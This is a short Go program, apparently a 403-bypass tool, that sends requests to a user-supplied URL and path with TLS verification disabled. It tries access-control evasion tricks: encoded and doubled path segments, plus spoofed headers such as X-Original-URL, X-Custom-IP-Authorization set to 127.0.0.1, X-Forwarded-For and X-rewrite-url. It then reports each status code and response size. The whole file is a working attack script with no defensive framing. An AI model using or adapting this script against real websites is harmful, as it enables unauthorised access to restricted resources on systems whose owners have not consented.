package main 

import (
	"os"
	"net/http"
	"fmt"
	"io/ioutil"
	"crypto/tls"
)



func request(method string, url string, headers map[string]string){
	client := &http.Client{}
	req, _ := http.NewRequest(method, url, nil)

	for header,value := range headers{
		req.Header.Add(header, value)
	}

	resp, err := client.Do(req)
	if err != nil {
    	fmt.Println(err) 
	}
	data,_ := ioutil.ReadAll(resp.Body)
	fmt.Println(method, url, resp.StatusCode, len(data))
	defer resp.Body.Close()

}

func main(){
	http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true}

	var url,path string = os.Args[1],os.Args[2]
	headers := make(map[string]string, 5)
	headers["User-Agent"] = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36"
	request("GET", url+"/"+path, headers)
	request("GET", url+"/%2e/"+path, headers)
	request("GET", url+"/"+path+"/.", headers)
	request("GET", url+"//"+path+"//", headers)
	request("GET", url+"/./"+path+"/./", headers)

	request("POST", url+"/"+path, headers)
	request("POST", url+"/%2e/"+path, headers)
	request("POST", url+"/"+path+"/.", headers)
	request("POST", url+"//"+path+"//", headers)
	request("POST", url+"/./"+path+"/./", headers)

	headers["X-Original-URL"]=path
	request("GET", url+"/"+path, headers)
	delete(headers, "X-Original-URL")

	headers["X-Custom-IP-Authorization"]="127.0.0.1"
	request("GET", url+"/"+path, headers)
	delete(headers, "X-Custom-IP-Authorization")

	headers["X-Forwarded-For"]="http://127.0.0.1:80"
	request("GET", url+"/"+path, headers)
	delete(headers, "X-Forwarded-For")

	headers["X-Forwarded-For"]="127.0.0.1:80"
	request("GET", url+"/"+path, headers)
	delete(headers, "X-Forwarded-For")

	headers["X-rewrite-url"]=path
	request("GET", url+"/"+path, headers)
	delete(headers, "X-rewrite-url")



}
